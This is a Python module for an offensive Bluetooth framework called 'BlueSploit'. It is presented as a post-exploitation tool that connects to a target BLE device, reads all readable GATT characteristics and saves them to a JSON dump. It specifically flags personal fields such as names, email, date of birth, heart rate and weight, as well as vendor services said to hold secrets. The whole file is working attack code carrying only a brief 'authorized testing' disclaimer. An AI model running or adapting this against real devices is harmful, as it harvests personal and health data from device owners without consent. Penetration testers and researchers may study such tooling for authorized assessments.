"""
BlueSploit Post-Exploitation: BLE GATT Data Exfiltration

After gaining adjacency to a BLE device, reads every readable GATT
characteristic and saves the raw values. Targets common sensitive
UUIDs: Device Information, Battery, Health, proprietary vendor
services. Results saved to file in JSON + hex format.

Useful after: ble_pairing_downgrade, ble_sc_bypass, unauth_write
"""

import asyncio
import json
import os
import time
from typing import Dict, List, Optional, Tuple
from core.base import AuxiliaryModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    from bleak import BleakClient, BleakScanner
    from bleak.exc import BleakError, BleakDeviceNotFoundError
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False

# Standard UUIDs with known sensitivity
SENSITIVE_UUIDS: Dict[str, str] = {
    "00002a00-0000-1000-8000-00805f9b34fb": "Device Name",
    "00002a01-0000-1000-8000-00805f9b34fb": "Appearance",
    "00002a23-0000-1000-8000-00805f9b34fb": "System ID",
    "00002a24-0000-1000-8000-00805f9b34fb": "Model Number",
    "00002a25-0000-1000-8000-00805f9b34fb": "Serial Number",
    "00002a26-0000-1000-8000-00805f9b34fb": "Firmware Revision",
    "00002a27-0000-1000-8000-00805f9b34fb": "Hardware Revision",
    "00002a28-0000-1000-8000-00805f9b34fb": "Software Revision",
    "00002a29-0000-1000-8000-00805f9b34fb": "Manufacturer Name",
    "00002a19-0000-1000-8000-00805f9b34fb": "Battery Level",
    "00002a37-0000-1000-8000-00805f9b34fb": "Heart Rate Measurement",
    "00002a6e-0000-1000-8000-00805f9b34fb": "Temperature",
    "00002a6d-0000-1000-8000-00805f9b34fb": "Pressure",
    "00002a6f-0000-1000-8000-00805f9b34fb": "Humidity",
    "00002a9d-0000-1000-8000-00805f9b34fb": "Weight Measurement",
    "00002a9f-0000-1000-8000-00805f9b34fb": "User Control Point",
    "00002a55-0000-1000-8000-00805f9b34fb": "SC Control Point",
    "00002a52-0000-1000-8000-00805f9b34fb": "Record Access Control",
    "00002a9a-0000-1000-8000-00805f9b34fb": "User Index",
    "00002a8a-0000-1000-8000-00805f9b34fb": "First Name",
    "00002a90-0000-1000-8000-00805f9b34fb": "Last Name",
    "00002a87-0000-1000-8000-00805f9b34fb": "Email Address",
    "00002a80-0000-1000-8000-00805f9b34fb": "Age",
    "00002a85-0000-1000-8000-00805f9b34fb": "Date of Birth",
    "00002a8c-0000-1000-8000-00805f9b34fb": "Gender",
}

# Short UUID prefixes for proprietary vendor services often holding secrets
VENDOR_PREFIXES = ["0000ffe", "0000fff", "0000ffd", "0000fee", "0000fed",
                   "6e400001", "6e400002", "6e400003"]


def _uuid_label(uuid: str) -> str:
    lower = uuid.lower()
    if lower in SENSITIVE_UUIDS:
        return SENSITIVE_UUIDS[lower]
    for prefix in VENDOR_PREFIXES:
        if lower.startswith(prefix):
            return "Vendor/Proprietary"
    return "Standard"


def _is_printable(data: bytes) -> bool:
    return all(0x20 <= b < 0x7F or b in (0x09, 0x0A, 0x0D) for b in data)


class Module(AuxiliaryModule):
    """
    BLE GATT Exfiltration

    Connects to a BLE target and reads all readable characteristics,
    flagging sensitive UUIDs and saving everything to a JSON dump file.
    """

    info = ModuleInfo(
        name="BLE GATT Data Exfiltration",
        description="Read all GATT characteristics from a BLE device and exfiltrate data",
        author=["v33ru"],
        protocol=BTProtocol.BLE,
        severity=Severity.HIGH,
        cve=None,
        references=[
            "https://www.bluetooth.com/specifications/specs/gatt-specification-supplement/",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target BLE device MAC / UUID address",
        ))
        self.add_option(ModuleOption(
            name="output_file",
            required=False,
            description="JSON output file path (empty = auto-generated)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="timeout",
            required=False,
            description="Connection timeout in seconds",
            default=15,
        ))
        self.add_option(ModuleOption(
            name="read_timeout",
            required=False,
            description="Per-characteristic read timeout in seconds",
            default=3,
        ))
        self.add_option(ModuleOption(
            name="sensitive_only",
            required=False,
            description="Only dump known-sensitive UUIDs (true/false)",
            default="false",
        ))

    def run(self) -> bool:
        if not BLEAK_AVAILABLE:
            print_error("bleak required — pip install bleak")
            return False

        target = self.get_option("target")
        if not target:
            print_error("Target address required")
            return False

        output_file = self.get_option("output_file")
        timeout = int(self.get_option("timeout"))
        read_timeout = int(self.get_option("read_timeout"))
        sensitive_only = str(self.get_option("sensitive_only")).lower() == "true"

        if not output_file:
            ts = time.strftime("%Y%m%d_%H%M%S")
            safe_addr = target.replace(":", "")
            output_file = f"gatt_exfil_{safe_addr}_{ts}.json"

        C = Colors
        print(f"\n  {C.RED}╔{'═'*58}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}BLE GATT Data Exfiltration{C.RESET}                               {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*58}╝{C.RESET}\n")

        print_info(f"Target        : {target}")
        print_info(f"Output file   : {output_file}")
        print_info(f"Sensitive only: {sensitive_only}")
        print_warning("DISCLAIMER: For authorized security testing only!")

        result = asyncio.run(self._exfil(target, timeout, read_timeout, sensitive_only))

        if result is None:
            print_error("Failed to connect to target")
            return False

        chars_read, chars_failed, dump = result

        try:
            with open(output_file, "w") as f:
                json.dump(dump, f, indent=2)
            print_success(f"Saved {chars_read} characteristic(s) to {output_file}")
        except OSError as e:
            print_error(f"Could not write output file: {e}")

        self.add_result({
            "target": target,
            "characteristics_read": chars_read,
            "characteristics_failed": chars_failed,
            "output_file": output_file,
            "dump": dump,
        })

        return chars_read > 0

    async def _exfil(
        self, target: str, timeout: int, read_timeout: int, sensitive_only: bool
    ) -> Optional[Tuple[int, int, dict]]:
        dump: Dict = {"target": target, "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
                      "services": []}
        chars_read = 0
        chars_failed = 0

        try:
            async with BleakClient(target, timeout=float(timeout)) as client:
                print_success(f"Connected to {target}")

                for svc in client.services:
                    svc_entry: Dict = {
                        "uuid": str(svc.uuid),
                        "description": svc.description or "",
                        "characteristics": [],
                    }

                    for char in svc.characteristics:
                        uuid_str = str(char.uuid).lower()
                        label = _uuid_label(uuid_str)
                        is_sensitive = uuid_str in SENSITIVE_UUIDS

                        if sensitive_only and not is_sensitive:
                            continue

                        char_entry: Dict = {
                            "uuid": uuid_str,
                            "label": label,
                            "properties": char.properties,
                            "sensitive": is_sensitive,
                            "value_hex": None,
                            "value_ascii": None,
                        }

                        if "read" in char.properties:
                            try:
                                data = await asyncio.wait_for(
                                    client.read_gatt_char(char.uuid),
                                    timeout=float(read_timeout),
                                )
                                char_entry["value_hex"] = data.hex()
                                if _is_printable(data):
                                    char_entry["value_ascii"] = data.decode("utf-8", errors="replace")
                                chars_read += 1

                                flag = " [SENSITIVE]" if is_sensitive else ""
                                print_success(
                                    f"  {uuid_str[:8]}… {label}{flag}: "
                                    f"{data.hex()[:40]}{'…' if len(data.hex()) > 40 else ''}"
                                )
                            except asyncio.TimeoutError:
                                char_entry["error"] = "read timeout"
                                chars_failed += 1
                            except BleakError as e:
                                char_entry["error"] = str(e)
                                chars_failed += 1
                        else:
                            char_entry["error"] = "not readable"

                        svc_entry["characteristics"].append(char_entry)

                    dump["services"].append(svc_entry)

        except BleakDeviceNotFoundError:
            print_error(f"Device {target} not found — ensure it is advertising")
            return None
        except BleakError as e:
            print_error(f"BLE connection error: {e}")
            return None
        except OSError as e:
            print_error(f"Adapter error: {e}")
            return None

        print_info("─" * 55)
        print_info(f"Read: {chars_read} | Failed/skipped: {chars_failed}")

        return chars_read, chars_failed, dump
